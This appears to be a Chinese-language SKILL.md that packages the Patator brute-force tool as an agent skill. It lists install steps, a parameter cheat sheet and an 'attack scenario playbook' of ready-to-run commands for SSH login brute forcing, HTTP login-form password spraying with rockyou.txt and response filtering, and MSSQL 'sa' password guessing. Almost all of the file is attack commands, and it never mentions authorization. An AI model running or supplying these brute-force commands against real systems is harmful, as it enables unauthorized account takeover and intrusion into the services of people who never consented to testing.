---
name: patator-multi-brute
description: Patator: HTTP 表单爆破+条件过滤、数据库爆破。信号:暴力破解,口令喷射,SSH,SMB。
---

# Patator

- 攻击大类:C28 暴力破解与口令喷射
- 上游仓库:https://github.com/lanjelot/patator
- 上游 License:LGPL-2.1(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/lanjelot/patator && cd patator
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python patator.py ssh_login host=10.0.0.5 user=FILE0 password=FILE1 0=users.txt 1=pass.txt` | SSH |
| `http_fuzz url=https://t.com/login user_pass=FILE0:FILE1 ...` | HTTP |
| `smb_login` | SMB |
| `ftp_login` | FTP |
| `-t 20` | 线程 |
| `-x ignore:code=401` | 排除条件 |
| `range=0-10000` | 生成器 |

## 攻击场景 Playbook

### HTTP 表单爆破+条件过滤

```bash
python patator.py http_fuzz url=https://target/login.php method=POST body='user=FILE0&pass=FILE1' 0=users.txt 1=rockyou.txt -x ignore:fgrep='Invalid' -t 20
```

### 数据库爆破

```bash
python patator.py mssql_login host=10.0.0.8 user=sa password=FILE0 0=pass.txt
```

## 注意事项

Python 写的万能爆破框架,条件过滤(-x ignore)极其灵活;支持自定义请求任意字段。
